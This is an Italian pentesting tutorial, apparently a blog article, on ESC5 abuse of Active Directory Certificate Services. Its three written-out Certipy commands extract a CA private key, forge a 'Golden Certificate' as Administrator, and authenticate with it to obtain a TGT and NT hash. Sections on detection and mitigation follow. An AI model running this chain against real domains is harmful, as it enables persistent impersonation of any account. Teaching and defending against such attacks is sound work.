---
title: 'ESC5 ADCS Privilege Escalation: Golden Certificate e CA Compromise con Certipy'
slug: esc5-adcs
description: 'ESC5 ADCS Privilege Escalation: compromettere la PKI Active Directory e forgiare Golden Certificate tramite la chiave privata della CA usando Certipy.'
image: /esc5.webp
draft: true
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - certipy
  - esc
---

ESC5 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che colpisce direttamente l'infrastruttura PKI del dominio.

Invece di sfruttare un singolo certificate template, ESC5 prende di mira gli **oggetti PKI nel Configuration Naming Context** o il **server Certificate Authority stesso**. Se un attaccante ottiene accesso alla chiave privata della CA, può generare **Golden Certificates** e impersonare qualsiasi utente del dominio.

## In questa guida vediamo **come sfruttare ESC5 ADCS con Certipy**, dalla compromissione della CA fino alla creazione di certificati validi per **Administrator o qualsiasi altro account Active Directory**.

## Quando ESC5 ADCS È Sfruttabile

* L'attaccante ha permessi di scrittura su oggetti PKI nel Configuration Naming Context:
  * `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration`
  * Container AIA e CDP
  * `CN=Certificate Templates,CN=Public Key Services`
  * Oggetti OID policy
  * Computer account del server CA
* Compromissione del server CA (accesso shell)

***

## Exploit ESC5 ADCS Con Certipy

Certipy **non rileva direttamente ESC5** con `find`. Serve analisi manuale delle ACL con BloodHound, PowerShell, o ADSIEdit.

Se la CA è compromessa, Certipy supporta il **Golden Certificate** — la forma più persistente di domain dominance via ADCS.

### Step 1 — Backup della chiave privata CA (richiede accesso admin alla CA)

```bash
certipy ca -u 'administrator@corp.local' -p 'Password123' -ns 10.0.0.100 -target CA.CORP.LOCAL -config 'CA.CORP.LOCAL\CORP-CA' -backup
```

### Step 2 — Forgia un certificato come qualsiasi utente

```bash
certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
```

### Step 3 — Autenticati con il certificato forgiato

```bash
certipy auth -pfx 'administrator_forged.pfx' -dc-ip 10.0.0.100
```

Il Golden Certificate funziona finché la CA esiste. Sopravvive a password reset, a rotazione di krbtgt, a quasi tutto.

***

## Output Dell'Attacco ESC5

* **Golden Certificate** — capacità di forgiare certificati per qualsiasi utente, indefinitamente
* **TGT + NT hash** di qualsiasi account
* Persistenza a lungo termine nel dominio

***

## Detection ESC5 ADCS

* Audita tutte le ACL sotto `CN=Public Key Services,CN=Services,CN=Configuration`
* Monitora accessi al server CA (logon, accesso file, accesso registro)
* Verifica l'integrità della chiave privata CA

***

## Mitigation ESC5 ADCS

* Restringi i permessi di scrittura sugli oggetti PKI ai soli amministratori Tier-0
* Tratta il server CA come asset **Tier-0** (stesso livello dei Domain Controller)
* Proteggi la chiave privata CA con HSM

***

## FAQ — ESC5 ADCS

### Cos'è ESC5 in ADCS?

ESC5 è l'abuso di ACL deboli sugli oggetti PKI a livello di infrastruttura AD (non singoli template). Permette di manipolare l'intera PKI o, in caso di compromissione della CA, di forgiare certificati illimitati.

### Come sfruttare ESC5 con Certipy?

Certipy non rileva ESC5 automaticamente. Se la CA è compromessa, si usa `certipy ca -backup` per estrarre la chiave privata, poi `certipy forge` per creare certificati come qualsiasi utente.

### ESC5 permette Domain Admin?

Sì — e molto di più. Il Golden Certificate permette di impersonare qualsiasi utente del dominio indefinitamente. È la forma più persistente di controllo del dominio via ADCS.

### Qual è la differenza tra ESC5 e ESC4?

[ESC4](https://hackita.it/articoli/esc4-adcs) colpisce un singolo template tramite ACL deboli. ESC5 colpisce l'infrastruttura PKI stessa — oggetti container, NTAuthCertificates, server CA.

**Key Takeaway:** Se un attaccante compromette la CA, può forgiare certificati per qualsiasi utente indefinitamente — il Golden Certificate è il Golden Ticket della PKI.

> ESC5 rappresenta il livello più alto di compromissione **Active Directory Certificate Services**. Per capire l'intera superficie di attacco leggi la guida completa: [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16).\
> Continua con le tecniche successive: [ESC6 ADCS](https://hackita.it/articoli/esc6-adcs) · [ESC7 ADCS](https://hackita.it/articoli/esc7-adcs).Se questo contenuto ti è utile puoi **supportare HackIta** su [Supporta](https://hackita.it/supporto).\
> Vuoi imparare **pentesting Active Directory e offensive security 1:1** oppure **testare la sicurezza del tuo sito o infrastruttura aziendale**? Vai su [Servizi HackIta](https://hackita.it/servizi).Riferimenti tecnici:\
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)\
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)\
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
